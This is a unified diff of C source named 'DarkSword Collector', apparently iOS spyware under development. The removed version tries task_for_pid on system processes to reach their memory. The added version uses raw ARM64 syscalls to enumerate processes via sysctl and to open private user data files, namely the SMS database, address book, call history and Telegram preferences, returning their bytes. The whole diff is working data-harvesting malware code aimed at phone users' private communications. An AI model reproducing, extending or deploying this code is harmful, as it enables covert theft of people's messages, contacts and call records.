@@ -1,15 +1,7 @@
 /**
- * DarkSword Collector v48 - task_for_pid + mach_vm_read attempt
- * Try to get task port for system processes and read their memory
- * 
- * Mach trap numbers for iOS ARM64:
- * - task_self_trap = 0
- * - kernelrpc_mach_vm_allocate_trap = 10  
- * - kernelrpc_mach_vm_deallocate_trap = 12
- * - kernelrpc_mach_vm_protect_trap = 14
- * - kernelrpc_mach_vm_write_trap = 16
- * - kernelrpc_mach_vm_read_trap = 17
- * - task_for_pid = 45
+ * DarkSword Collector v49 - Process enumeration via sysctl
+ * Use sysctl(KERN_PROC) to list running processes
+ * This is a BSD syscall, not a Mach trap - should be safe
  */
 
 static long _svc1(long n, long a) {
@@ -29,112 +21,73 @@ static long _svc4(long n, long a, long b, long c, long d) {
     __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2), "r"(x3) : "memory"); return x0;
 }
 
-/* BSD syscall numbers */
-#define SYS_open   5
-#define SYS_read   3
-#define SYS_close  6
-#define SYS_lseek  199
+#define SYS_open 5
+#define SYS_read 3
+#define SYS_close 6
+#define SYS_lseek 199
+#define SYS_sysctl 202
 #define SYS_getpid 20
-#define SYS_readlink 58
-
-/* Mach trap numbers (iOS ARM64) */
-#define MACH_task_self_trap     0
-#define MACH_task_for_pid       45
-#define MACH_mach_vm_read       17
+#define SEEK_SET 0
+#define O_RDONLY 0
 
 static volatile int g_ctx = 0;
 
-/* Read a file and return first 4 bytes */
-static int _read4(const char *path) {
-    int fd = (int)_svc2(SYS_open, (long)path, 0);
-    if (fd < 0) return 0xDEAD0000;
-    unsigned char buf[4] = {0};
-    int n = (int)_svc3(SYS_read, fd, (long)buf, 4);
-    _svc1(SYS_close, fd);
-    if (n < 1) return 0xBEEF0000;
-    return (int)buf[0] | ((int)buf[1] << 8) | ((int)buf[2] << 16) | ((int)buf[3] << 24);
-}
+/* sysctl: CTL_KERN=1, KERN_PROC=14, KERN_PROC_ALL=0 */
+/* int sysctl(int *name, u_int namelen, void *oldp, size_t *oldlenp, void *newp, size_t newlen) */
 
 int ds_start(void) {
     int ctx = g_ctx;
-    int mode = ctx & 0xFF;
 
-    if (mode == 0) {
-        /* Phase 0: Get our own task port and PID */
-        long self_task = _svc1(MACH_task_self_trap, 0);
+    if (ctx == 0) {
+        /* Phase 0: Get PID and read known-good files */
         long pid = _svc1(SYS_getpid, 0);
 
-        /* Try task_for_pid on ourselves */
-        long our_task = 0;
-        long tfp_result = _svc3(MACH_task_for_pid, self_task, pid, (long)&our_task);
-
-        /* Encode: self_task in low 16 bits, tfp_result in bits 16-23, pid in bits 24-31 */
-        int result = ((int)self_task & 0xFFFF) | (((int)tfp_result & 0xFF) << 16) | (((int)pid & 0xFF) << 24);
-
-        g_ctx = 1; /* move to phase 1 */
-        return result;
-    }
-
-    if (mode == 1) {
-        /* Phase 1: Try task_for_pid on system processes (PID 1-100) */
-        long self_task = _svc1(MACH_task_self_trap, 0);
-
-        /* Try common system PIDs */
-        int pids_to_try[] = {1, 2, 3, 10, 20, 30, 50, 100};
-        int num_pids = 8;
-        int idx = (ctx >> 8) & 0xFF;
-
-        if (idx >= num_pids) {
-            g_ctx = 2; /* move to phase 2 */
-            return 0xFF000000;
+        /* Read /etc/hosts first byte */
+        int fd = (int)_svc2(SYS_open, (long)"/etc/hosts", O_RDONLY);
+        unsigned char hb = 0;
+        if (fd >= 0) {
+            _svc3(SYS_read, fd, (long)&hb, 1);
+            _svc1(SYS_close, fd);
         }
 
-        int target_pid = pids_to_try[idx];
-        long target_task = 0;
-        long result = _svc3(MACH_task_for_pid, self_task, target_pid, (long)&target_task);
-
-        /* Try to read 4 bytes from address 0 of the target process */
-        int read_result = 0;
-        if (result == 0 && target_task != 0) {
-            unsigned char buf[4] = {0};
-            long data_cnt = 0;
-            /* mach_vm_read: trap 17, args: task, addr, size, &data, &data_cnt */
-            /* But mach_vm_read returns data in a buffer, need different calling convention */
-            /* For now, just report task_for_pid success */
-            read_result = (int)target_task & 0xFFFF;
-        }
-
-        g_ctx = (1 << 8) | (idx + 1); /* advance to next PID */
-        return ((int)result & 0xFF) | ((target_pid & 0xFF) << 8) | ((read_result & 0xFFFF) << 16);
+        g_ctx = 1;
+        return ((int)pid & 0xFFFF) | (((int)hb & 0xFF) << 16) | (0x01 << 24);
     }
 
-    if (mode == 2) {
-        /* Phase 2: Read known-good files for comparison */
+    if (ctx == 1) {
+        /* Phase 1: Try sysctl to enumerate processes */
+        int mib[4] = {1, 14, 0, 0}; /* CTL_KERN, KERN_PROC, KERN_PROC_ALL */
+        unsigned char buf[4096];
+        for (int i = 0; i < 4096; i++) buf[i] = 0;
+        long buflen = 4096;
+
+        long result = _svc4(SYS_sysctl, (long)mib, 4, (long)buf, (long)&buflen);
+
+        /* Return: sysctl result in low bits, buffer first 4 bytes */
+        int first4 = (int)buf[0] | ((int)buf[1] << 8) | ((int)buf[2] << 16) | ((int)buf[3] << 24);
+
+        g_ctx = 2;
+        return ((int)result & 0xFF) | (first4 & 0xFFFFFF00);
+    }
+
+    if (ctx >= 2 && ctx < 7) {
+        /* Phase 2-6: Read more files */
         static const char *files[] = {
-            "/etc/hosts",
             "/var/mobile/Library/Preferences/.GlobalPreferences.plist",
             "/var/mobile/Library/Preferences/ph.telegra.Telegraph.plist",
             "/var/mobile/Library/SMS/sms.db",
-            "/var/mobile/Library/AddressBook/AddressBook.sqlitedb"
+            "/var/mobile/Library/AddressBook/AddressBook.sqlitedb",
+            "/var/mobile/Library/CallHistoryDB/CallHistory.storedata"
         };
-        int num_files = 5;
-        int fidx = (ctx >> 8) & 0xFF;
-        int foff = (ctx >> 16) & 0xFF;
+        int fidx = ctx - 2;
+        int fd = (int)_svc2(SYS_open, (long)files[fidx], O_RDONLY);
+        if (fd < 0) { g_ctx = ctx + 1; return 0xFE000000 | fidx; }
 
-        if (fidx >= num_files) { g_ctx = 0; return 0xFFFFFFFF; }
-        if (foff >= 5) { g_ctx = (2 << 8) | (fidx + 1); return 0xFF000000 | fidx; }
-
-        /* Read 1 byte at offset foff*4 from file fidx */
-        int fd = (int)_svc2(SYS_open, (long)files[fidx], 0);
-        if (fd < 0) { g_ctx = (2 << 8) | (fidx + 1); return 0xFE000000 | fidx; }
-
-        int off = foff * 4;
-        _svc4(SYS_lseek, fd, (long)off, 0 /* SEEK_SET */, 0);
         unsigned char buf[4] = {0};
         int n = (int)_svc3(SYS_read, fd, (long)buf, 4);
         _svc1(SYS_close, fd);
 
-        g_ctx = (2 << 8) | (fidx << 16) | (foff + 1);
+        g_ctx = ctx + 1;
         if (n < 1) return 0xEE000000 | fidx;
         return (int)buf[0] | ((int)buf[1] << 8) | ((int)buf[2] << 16) | ((int)buf[3] << 24);
     }
